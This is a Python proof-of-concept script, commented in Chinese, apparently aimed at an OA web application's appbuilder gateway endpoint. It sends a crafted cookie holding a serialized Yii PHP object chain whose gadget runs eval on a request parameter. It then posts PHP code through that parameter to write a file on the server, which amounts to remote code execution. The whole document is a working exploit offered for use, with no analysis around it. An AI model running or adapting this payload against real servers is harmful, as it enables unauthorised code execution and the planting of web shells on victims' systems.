import json
from openpyxl import Workbook
import requests


def poc_post(domain_or_ip):
    # 设置目标URL的域名部分
    target = domain_or_ip

    # 设置目标URL
    url = f'http://{target}/general/appbuilder/web/portal/gateway/moare?a=1'

    # 设置请求头部
    headers = {
        'Host': target,
        'User-Agent': 'python-requests/2.31.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '',
        'Connection': 'close',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': '_COOKIE=8a987cdbe51b7fe8c0efaf47430b18b96a1477de4a08291eef0f7164bd1b5a9cO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A8%3A%7Bs%3A32%3A%22%00yii%5Credis%5CConnection%00unixSocket%22%3Bi%3A0%3Bs%3A8%3A%22hostname%22%3Bs%3A13%3A%22www.baidu.com%22%3Bs%3A4%3A%22port%22%3Bs%3A3%3A%22443%22%3Bs%3A17%3A%22connectionTimeout%22%3Bi%3A30%3Bs%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A8%3A%22database%22%3BN%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A32%3A%22yii%5Ccaching%5CExpressionDependency%22%3A2%3A%7Bs%3A10%3A%22expression%22%3Bs%3A23%3A%22eval%28%24_REQUEST%5B%27img%27%5D%29%3B%22%3Bs%3A8%3A%22reusable%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A9%3A%22isChanged%22%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D%7D%7D%7D%7D%7D',
        'Content-Length': '81',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # 设置请求正文
    data = {'img': 'file_put_contents("../../shell.txt","hello");'}

    # 发送POST请求
    response = requests.post(url, headers=headers, data=data)

    # 输出响应
    print('响应状态码:', response.status_code)
    # 将响应包中的unicode转为中文并且json可视化
    decoded_text = bytes(response.text, 'utf-8').decode('unicode_escape')
    formatted_response = json.dumps(decoded_text, indent=4)
    print('响应内容:', formatted_response)


# if __name__ == '__main__':
#
#     ip=
#     poc_post(ip)

